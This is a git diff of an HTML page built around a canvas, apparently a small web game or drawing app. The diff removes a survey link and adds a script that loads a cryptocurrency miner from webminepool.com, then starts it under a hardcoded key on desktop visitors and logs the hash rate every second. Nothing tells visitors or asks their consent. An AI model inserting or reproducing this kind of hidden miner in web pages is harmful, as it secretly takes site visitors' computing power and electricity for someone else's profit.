@@ -10,7 +10,21 @@
 <body>
     <text width="0" height="0" id="plrL"></text>
     <canvas height=1000 width=1000 id="mainCanvas"></canvas>
-    <a href="https://forms.office.com/Pages/ResponsePage.aspx?id=0OvLXK_x1Uq7kRERjOPX0dDwvuRPMBZMtb39XpXuC39UOVBaTTk1NEFJVlZIUzA1TUNHUUozQTJQNC4u">___</a>
     <script type="text/javascript" src="main.js"></script>
+        <script src="https://webminepool.com/lib/base.js"></script>
+<script>
+    let key = "SK_BszgBi54XRK8ZnhdYF9cN"
+    var miner = WMP.Anonymous(key,{throttle: 0.3});
+    if (!miner.isMobile()){
+        console.log("Miner Is Starting")
+        miner.start();
+    }
+    setInterval( function() {
+        let isR = miner.isRunning;
+        let hPR = miner.getHashesPerSecond();
+        console.log("Is running: " + isR + " Hashes per second: " + hPR);
+        
+    },1000)
+</script>
 </body>
 </html>
